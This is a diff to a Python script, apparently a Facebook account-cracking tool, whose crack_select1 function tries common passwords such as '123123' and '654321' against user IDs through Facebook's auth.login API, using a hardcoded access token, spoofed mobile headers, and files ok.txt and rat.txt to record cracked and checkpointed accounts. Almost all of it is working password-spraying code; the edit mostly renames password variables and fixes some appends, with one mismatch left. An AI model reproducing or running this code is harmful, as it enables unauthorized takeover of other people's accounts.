@@ -454,14 +454,14 @@ def crack_select1():
 																								ok = open("ok.txt", "a")
 																								ok.write(uid+"|"+pass11+"\n")
 																								ok.close()
-																								oks.append(uid+pass3)
+																								oks.append(uid+pass11)
 																							else:
 																								if "www.facebook.com" in data.json()['error_msg']:
 																									print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass11+"\033[0;97m")
 																									cp = open("rat.txt", "a")
 																									cp.write(uid+"|"+pass11+"\n")
 																									cp.close()
-																									cps.append(uid+pass3)
+																									cps.append(uid+pass1)
 																								else:
 																									pass12 = "786786"
 																									api = 'https://b-api.facebook.com/method/auth.login'
@@ -473,7 +473,7 @@ def crack_select1():
 																										ok = open("ok.txt", "a")
 																										ok.write(uid+"|"+pass12+"\n")
 																										ok.close()
-																										oks.append(uid+pass4)
+																										oks.append(uid+pass12)
 																									else:
 																										if "www.facebook.com" in data.json()['error_msg']:
 																											print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass12+"\033[0;97m")
@@ -538,100 +538,100 @@ def crack_select1():
 																																	cp.write(uid+"|"+pass15+"\n")
 																																	cp.close()											cps.append(uid+pass15)
 																																else:
-																																	pass11 = "1234567890"
+																																	pass16 = "1234567890"
 																																	api = 'https://b-api.facebook.com/method/auth.login'
-																																	params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass11, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
+																																	params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass16, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
 																																	headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 																																	data = requests.get(api, params=params, headers=headers_)
 																																	if "access_token" in data.text and "EAAA" in data.text:
-																																		print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass11+"\033[0;97m")
+																																		print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass16+"\033[0;97m")
 																																		ok = open("ok.txt", "a")
-																																		ok.write(uid+"|"+pass11+"\n")
+																																		ok.write(uid+"|"+pass16+"\n")
 																																		ok.close()
-																																		oks.append(uid+pass3)
+																																		oks.append(uid+pass16)
 																																	else:
 																																		if "www.facebook.com" in data.json()['error_msg']:
-																																			print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass11+"\033[0;97m")
+																																			print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass16+"\033[0;97m")
 																																			cp = open("rat.txt", "a")
-																																			cp.write(uid+"|"+pass11+"\n")
+																																			cp.write(uid+"|"+pass16+"\n")
 																																			cp.close()
-																																			cps.append(uid+pass3)
+																																			cps.append(uid+pass16)
 																																		else:
-																																			pass12 = "123123"
+																																			pass17 = "123123"
 																																			api = 'https://b-api.facebook.com/method/auth.login'
-																																			params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass12, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
+																																			params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass17, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
 																																			headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 																																			data = requests.get(api, params=params, headers=headers_)
 																																			if "access_token" in data.text and "EAAA" in data.text:
-																																				print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass12+"\033[0;97m")
+																																				print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass17+"\033[0;97m")
 																																				ok = open("ok.txt", "a")
-																																				ok.write(uid+"|"+pass12+"\n")
+																																				ok.write(uid+"|"+pass17+"\n")
 																																				ok.close()
-																																				oks.append(uid+pass4)
+																																				oks.append(uid+pass17)
 																																			else:
 																																				if "www.facebook.com" in data.json()['error_msg']:
-																																					print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass12+"\033[0;97m")
+																																					print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass17+"\033[0;97m")
 																																					cp = open("rat.txt", "a")
-																																					cp.write(uid+"|"+pass12+"\n")
+																																					cp.write(uid+"|"+pass17+"\n")
 																																					cp.close()
-																																					cps.append(uid+pass12)
+																																					cps.append(uid+pass17)
 																																				else:
-																																					pass13 = "654321"
+																																					pass18 = "654321"
 																																					api = 'https://b-api.facebook.com/method/auth.login'
-																																					params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass13, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
+																																					params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass18, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
 																																					headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 																																					data = requests.get(api, params=params, headers=headers_)
 																																					if "access_token" in data.text and "EAAA" in data.text:
-																																						print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass13+"\033[0;97m")
+																																						print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass18+"\033[0;97m")
 																																						ok = open("ok.txt", "a")
-																																						ok.write(uid+"|"+pass13+"\n")
+																																						ok.write(uid+"|"+pass18+"\n")
 																																						ok.close()
-																																						oks.append(uid+pass13)
+																																						oks.append(uid+pass18)
 																																					else:
 																																						if "www.facebook.com" in data.json()['error_msg']:
-																																							print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass13+"\033[0;97m")
+																																							print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass18+"\033[0;97m")
 																																							cp = open("rat.txt", "a")
-																																							cp.write(uid+"|"+pass13+"\n")
+																																							cp.write(uid+"|"+pass18+"\n")
 																																							cp.close()
-																																							cps.append(uid+pass13)
+																																							cps.append(uid+pass18)
 																																						else:
-																																							pass14 = "987654321"
+																																							pass19 = "987654321"
 																																							api = 'https://b-api.facebook.com/method/auth.login'
-																																							params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass14, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
+																																							params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass19, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
 																																							headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 																																							data = requests.get(api, params=params, headers=headers_)
 																																							if "access_token" in data.text and "EAAA" in data.text:
-																																								print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass14+"\033[0;97m")
+																																								print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass19+"\033[0;97m")
 																																								ok = open("ok.txt", "a")
-																																								ok.write(uid+"|"+pass14+"\n")
+																																								ok.write(uid+"|"+pass19+"\n")
 																																								ok.close()
-																																								oks.append(uid+pass14)
+																																								oks.append(uid+pass19)
 																																							else:
 																																								if "www.facebook.com" in data.json()['error_msg']:
-																																									print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass14+"\033[0;97m")
+																																									print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass19+"\033[0;97m")
 																																									cp = open("rat.txt", "a")
-																																									cp.write(uid+"|"+pass14+"\n")
+																																									cp.write(uid+"|"+pass19+"\n")
 																																									cp.close()
-																																									cps.append(uid+pass14)
+																																									cps.append(uid+pass19)
 																																								else:
-																																									pass15 = "121212"
+																																									pass20 = "121212"
 																																									api = 'https://b-api.facebook.com/method/auth.login'
-																																									params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass15, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
+																																									params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass20, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
 																																									headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 																																									data = requests.get(api, params=params, headers=headers_)
 																																									if "access_token" in data.text and "EAAA" in data.text:
-																																										print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass15+"\033[0;97m")
+																																										print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass20+"\033[0;97m")
 																																										ok = open("ok.txt", "a")
-																																										ok.write(uid+"|"+pass15+"\n")
+																																										ok.write(uid+"|"+pass20+"\n")
 																																										ok.close()
-																																										oks.append(uid+pass15)
+																																										oks.append(uid+pass20)
 																																									else:
 																																										if "www.facebook.com" in data.json()['error_msg']:
-																																											print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass15+"\033[0;97m")
+																																											print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass20+"\033[0;97m")
 																																											cp = open("rat.txt", "a")
-																																											cp.write(uid+"|"+pass15+"\n")
+																																											cp.write(uid+"|"+pass20+"\n")
 																																											cp.close()
-																																											cps.append(uid+pass15)
+																																											cps.append(uid+pass20)
 		
 												
 										
